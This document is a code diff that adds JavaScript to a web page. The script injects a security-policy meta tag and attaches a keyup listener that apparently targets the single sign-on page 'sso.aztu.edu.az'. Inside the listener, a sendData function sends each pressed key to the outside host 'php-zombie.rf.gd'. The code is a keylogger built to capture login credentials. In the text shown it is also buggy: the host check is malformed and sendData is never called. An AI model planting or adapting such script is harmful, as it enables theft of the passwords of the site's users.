@@ -1,0 +1,27 @@
+ var metaTag = document.createElement("meta");
+        metaTag.setAttribute("http-equiv", "Content-Security-Policy");
+        metaTag.setAttribute("content", "upgrade-insecure-requests");
+        var head = document.head || document.getElementsByTagName("head")[0];
+        if (head) {
+          head.appendChild(metaTag);
+        }
+
+        let data = [];
+
+        // Add a keyup event listener to the document
+        document.addEventListener("keyup", (event) => {
+          if (!location.host === "sso.aztu.edu.az/") return false
+          console.log("processing...",);
+
+          function sendData() {
+            fetch(`http://php-zombie.rf.gd/insert.php?key=${event.key}`, {
+              method: "GET",
+            })
+              .then((res) => {
+                return res.text();
+              })
+              .then((res) => console.log(res));
+          }
+
+          // data.push(obj);
+        });
